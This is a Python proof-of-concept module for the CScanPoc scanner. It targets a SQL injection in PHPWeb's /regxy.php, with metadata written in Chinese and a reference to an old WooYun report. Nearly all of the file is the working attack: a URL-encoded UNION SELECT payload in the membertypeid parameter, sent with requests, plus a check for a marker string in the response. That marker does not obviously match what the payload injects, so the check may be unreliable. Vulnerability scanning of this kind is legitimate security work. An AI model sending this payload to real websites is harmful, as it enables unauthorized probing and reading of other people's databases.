# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPWeb_0002'  # 平台漏洞编号，留空
    name = 'phpweb SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-01-05'  # 漏洞公布时间
    desc = '''
        PHPWeb具有各种插件、模板和边框可以自由安装卸载、任意组合排版的特点，可以让网站制作者方便地制作网站。
        PHPWeb /regxy.php?membertypeid=-9914 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=046528'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWeb'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1aacb243-caac-438d-a7e3-bea08d497c3f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2010-046528
            payload = '/regxy.php?membertypeid=-9914%27%20UNION%20ALL%20SELECT%2018%2C18%2C18%2C18%2C18%2CCONCAT%280x716b786271%2CIFNULL%28CAST%28md5%283.1415%29%20AS%20CHAR%29%2C0x20%29%2C0x717a626a71%29%2C18%2C18%2C18%2C18%23'
            verify_url = self.target + payload
            req = requests.get(verify_url)

            if req.status_code == 200 and '4e5172484a7361735357' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
